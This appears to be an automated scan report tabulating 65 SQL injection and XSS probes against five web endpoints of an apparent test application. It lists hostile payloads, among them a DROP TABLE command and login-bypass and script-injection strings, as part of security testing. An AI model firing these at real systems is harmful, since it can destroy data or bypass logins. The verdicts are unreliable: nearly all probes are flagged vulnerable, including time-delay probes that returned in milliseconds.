# Injection Test Report
**Date:** 2026-06-13_05-43-42
**Total Tests:** 65
**Vulnerable:** 63
**Not Vulnerable:** 0
**Inconclusive:** 2

## Results

| Type | Endpoint | Parameter | Payload | Status | Latency | Verdict |
|------|----------|-----------|---------|--------|---------|--------|
| SQLi | /search | q | `' OR '1'='1` | 200 | 5.69ms | **VULNERABLE** |
| SQLi | /search | q | `' OR 1=1--` | 200 | 4.21ms | **VULNERABLE** |
| SQLi | /search | q | `'; DROP TABLE users;--` | 200 | 3.5ms | **VULNERABLE** |
| SQLi | /search | q | `' UNION SELECT NULL--` | 200 | 4.82ms | **VULNERABLE** |
| SQLi | /search | q | `' UNION SELECT NULL, NULL--` | 200 | 3.66ms | **VULNERABLE** |
| SQLi | /search | q | `admin'--` | 200 | 4.45ms | **VULNERABLE** |
| SQLi | /search | q | `1' AND SLEEP(5)--` | 200 | 3.33ms | **VULNERABLE** |
| SQLi | /search | q | `1' AND 1=2--` | 200 | 3.86ms | **VULNERABLE** |
| XSS | /search | q | `<script>alert(1)</script>` | 200 | 3.79ms | **VULNERABLE** |
| XSS | /search | q | `<img src=x onerror=alert(1)>` | 200 | 4.22ms | **VULNERABLE** |
| XSS | /search | q | `"><script>alert(1)</script>` | 200 | 5.5ms | **VULNERABLE** |
| XSS | /search | q | `<svg onload=alert(1)>` | 200 | 4.51ms | **VULNERABLE** |
| XSS | /search | q | `javascript:alert(1)` | 200 | 4.68ms | **VULNERABLE** |
| SQLi | /profile/{value} | user_id | `' OR '1'='1` | 200 | 3.75ms | **VULNERABLE** |
| SQLi | /profile/{value} | user_id | `' OR 1=1--` | 200 | 4.95ms | **VULNERABLE** |
| SQLi | /profile/{value} | user_id | `'; DROP TABLE users;--` | 200 | 4.44ms | **VULNERABLE** |
| SQLi | /profile/{value} | user_id | `' UNION SELECT NULL--` | 200 | 3.89ms | **VULNERABLE** |
| SQLi | /profile/{value} | user_id | `' UNION SELECT NULL, NULL--` | 200 | 3.47ms | **VULNERABLE** |
| SQLi | /profile/{value} | user_id | `admin'--` | 200 | 4.64ms | **VULNERABLE** |
| SQLi | /profile/{value} | user_id | `1' AND SLEEP(5)--` | 200 | 3.84ms | **VULNERABLE** |
| SQLi | /profile/{value} | user_id | `1' AND 1=2--` | 200 | 3.12ms | **VULNERABLE** |
| XSS | /profile/{value} | user_id | `<script>alert(1)</script>` | 404 | 2.94ms | **INCONCLUSIVE — No CSP header** |
| XSS | /profile/{value} | user_id | `<img src=x onerror=alert(1)>` | 200 | 3.94ms | **VULNERABLE** |
| XSS | /profile/{value} | user_id | `"><script>alert(1)</script>` | 404 | 2.86ms | **INCONCLUSIVE — No CSP header** |
| XSS | /profile/{value} | user_id | `<svg onload=alert(1)>` | 200 | 3.21ms | **VULNERABLE** |
| XSS | /profile/{value} | user_id | `javascript:alert(1)` | 200 | 3.27ms | **VULNERABLE** |
| SQLi | /login | username | `' OR '1'='1` | 200 | 5.82ms | **VULNERABLE** |
| SQLi | /login | username | `' OR 1=1--` | 200 | 2.93ms | **VULNERABLE** |
| SQLi | /login | username | `'; DROP TABLE users;--` | 200 | 2.82ms | **VULNERABLE** |
| SQLi | /login | username | `' UNION SELECT NULL--` | 200 | 2.69ms | **VULNERABLE** |
| SQLi | /login | username | `' UNION SELECT NULL, NULL--` | 200 | 3.7ms | **VULNERABLE** |
| SQLi | /login | username | `admin'--` | 200 | 3.06ms | **VULNERABLE** |
| SQLi | /login | username | `1' AND SLEEP(5)--` | 200 | 2.69ms | **VULNERABLE** |
| SQLi | /login | username | `1' AND 1=2--` | 200 | 2.82ms | **VULNERABLE** |
| XSS | /login | username | `<script>alert(1)</script>` | 200 | 2.83ms | **VULNERABLE** |
| XSS | /login | username | `<img src=x onerror=alert(1)>` | 200 | 3.44ms | **VULNERABLE** |
| XSS | /login | username | `"><script>alert(1)</script>` | 200 | 4.17ms | **VULNERABLE** |
| XSS | /login | username | `<svg onload=alert(1)>` | 200 | 2.54ms | **VULNERABLE** |
| XSS | /login | username | `javascript:alert(1)` | 200 | 2.78ms | **VULNERABLE** |
| SQLi | /greet | name | `' OR '1'='1` | 200 | 4.61ms | **VULNERABLE** |
| SQLi | /greet | name | `' OR 1=1--` | 200 | 3.46ms | **VULNERABLE** |
| SQLi | /greet | name | `'; DROP TABLE users;--` | 200 | 3.24ms | **VULNERABLE** |
| SQLi | /greet | name | `' UNION SELECT NULL--` | 200 | 3.19ms | **VULNERABLE** |
| SQLi | /greet | name | `' UNION SELECT NULL, NULL--` | 200 | 4.28ms | **VULNERABLE** |
| SQLi | /greet | name | `admin'--` | 200 | 5.47ms | **VULNERABLE** |
| SQLi | /greet | name | `1' AND SLEEP(5)--` | 200 | 3.25ms | **VULNERABLE** |
| SQLi | /greet | name | `1' AND 1=2--` | 200 | 3.12ms | **VULNERABLE** |
| XSS | /greet | name | `<script>alert(1)</script>` | 200 | 3.78ms | **VULNERABLE** |
| XSS | /greet | name | `<img src=x onerror=alert(1)>` | 200 | 4.91ms | **VULNERABLE** |
| XSS | /greet | name | `"><script>alert(1)</script>` | 200 | 4.41ms | **VULNERABLE** |
| XSS | /greet | name | `<svg onload=alert(1)>` | 200 | 4.34ms | **VULNERABLE** |
| XSS | /greet | name | `javascript:alert(1)` | 200 | 5.01ms | **VULNERABLE** |
| SQLi | /comment | text | `' OR '1'='1` | 200 | 4.24ms | **VULNERABLE** |
| SQLi | /comment | text | `' OR 1=1--` | 200 | 4.05ms | **VULNERABLE** |
| SQLi | /comment | text | `'; DROP TABLE users;--` | 200 | 4.29ms | **VULNERABLE** |
| SQLi | /comment | text | `' UNION SELECT NULL--` | 200 | 3.12ms | **VULNERABLE** |
| SQLi | /comment | text | `' UNION SELECT NULL, NULL--` | 200 | 3.34ms | **VULNERABLE** |
| SQLi | /comment | text | `admin'--` | 200 | 5.15ms | **VULNERABLE** |
| SQLi | /comment | text | `1' AND SLEEP(5)--` | 200 | 5.1ms | **VULNERABLE** |
| SQLi | /comment | text | `1' AND 1=2--` | 200 | 3.02ms | **VULNERABLE** |
| XSS | /comment | text | `<script>alert(1)</script>` | 200 | 3.57ms | **VULNERABLE** |
| XSS | /comment | text | `<img src=x onerror=alert(1)>` | 200 | 3.36ms | **VULNERABLE** |
| XSS | /comment | text | `"><script>alert(1)</script>` | 200 | 3.74ms | **VULNERABLE** |
| XSS | /comment | text | `<svg onload=alert(1)>` | 200 | 3.33ms | **VULNERABLE** |
| XSS | /comment | text | `javascript:alert(1)` | 200 | 3.51ms | **VULNERABLE** |
